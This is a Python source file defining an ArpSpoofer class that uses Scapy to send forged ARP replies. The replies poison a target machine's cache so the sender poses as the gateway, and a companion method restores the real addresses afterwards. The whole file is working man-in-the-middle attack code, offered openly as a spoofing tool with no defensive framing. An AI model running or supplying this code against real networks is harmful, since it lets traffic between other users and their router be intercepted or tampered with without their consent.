from scapy.all import send, srp
from scapy.config import conf
from scapy.layers.dot11 import Dot11
from scapy.layers.inet import ICMP, IP
from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import sniff
import socket
import scapy as scapy

class ArpSpoofer:

    def __init__(self,target_ip,gateway_ip):
        self.target_ip=target_ip
        self.gateway_ip=gateway_ip

    def restore(self,verbose=True):
        """
        Restores the normal process of a regular network
        This is done by sending the original information
        (real IP and MAC of `host_ip` ) to `target_ip`
        """
        # get the real MAC address of target
        target_mac = ArpSpoofer.get_mac(self.target_ip)
        # get the real MAC address of spoofed (gateway, i.e router)
        host_mac = ArpSpoofer.get_mac(self.gateway_ip)
        # crafting the restoring packet
        arp_response = ARP(pdst=self.target_ip, hwdst=target_mac, psrc=self.gateway_ip, hwsrc=host_mac)
        # sending the restoring packet
        # to restore the network to its normal process
        # we send each reply seven times for a good measure (count=7)
        send(arp_response, verbose=0, count=7)
        if verbose:
            print("[+] Sent to {} : {} is-at {}".format(self.target_ip, self.gateway_ip, host_mac))

    @staticmethod
    def get_gateway_ip():
        return str(conf.route.route("0.0.0.0")[2])

    @staticmethod
    def get_mac(ip):
        """
        Returns MAC address of any device connected to the network
        If ip is down, returns None instead
        """
        ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip), timeout=3, verbose=0)
        if ans:
            return ans[0][1].src

    def spoof(self, verbose=True):
        """
        Spoofs `target_ip` saying that we are `host_ip`.
        it is accomplished by changing the ARP cache of the target (poisoning)
        """
        # get the mac address of the target
        target_mac = ArpSpoofer.get_mac(self.target_ip)
        # craft the arp 'is-at' operation packet, in other words; an ARP response
        # we don't specify 'hwsrc' (source MAC address)
        # because by default, 'hwsrc' is the real MAC address of the sender (ours)
        arp_response = ARP(pdst=self.target_ip, hwdst=target_mac, psrc=self.gateway_ip, op='is-at')
        # send the packet
        # verbose = 0 means that we send the packet without printing any thing
        send(arp_response, verbose=0)
        if verbose:
            # get the MAC address of the default interface we are using
            self_mac = ARP().hwsrc
            print("[+] Sent to {} : {} is-at {}".format(self.target_ip, self.gateway_ip, self_mac))

